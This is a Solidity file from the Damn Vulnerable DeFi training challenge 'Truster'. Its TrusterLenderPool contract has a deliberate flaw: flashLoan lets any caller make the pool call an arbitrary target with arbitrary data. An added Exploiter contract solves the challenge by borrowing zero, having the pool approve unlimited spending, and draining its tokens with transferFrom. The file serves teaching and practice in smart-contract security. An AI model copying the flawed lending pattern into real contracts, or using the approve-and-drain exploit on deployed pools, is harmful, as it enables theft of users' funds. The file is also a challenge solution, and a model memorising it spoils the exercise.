// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

import "../utilities/DamnValuableToken.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
}

// add your exploiter contract here
contract Exploiter {
    /**
     * `target.functionCall(data)` enables us to call `approve()` on the token address.
     * Once we have approval, we can transfer the tokens to us.
     * Since there is no check on amount, we can just borrow 0 amount and get approval
     * in single transaction without any trouble.
     */
    function exploit(TrusterLenderPool pool, DamnValuableToken token, uint256 amount) public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );

        pool.flashLoan(
            0,
            address(this),
            address(token),
            data
        );

        bool success = token.transferFrom(address(pool), address(this), amount);
        require(success, "transferFrom failed");
    }
}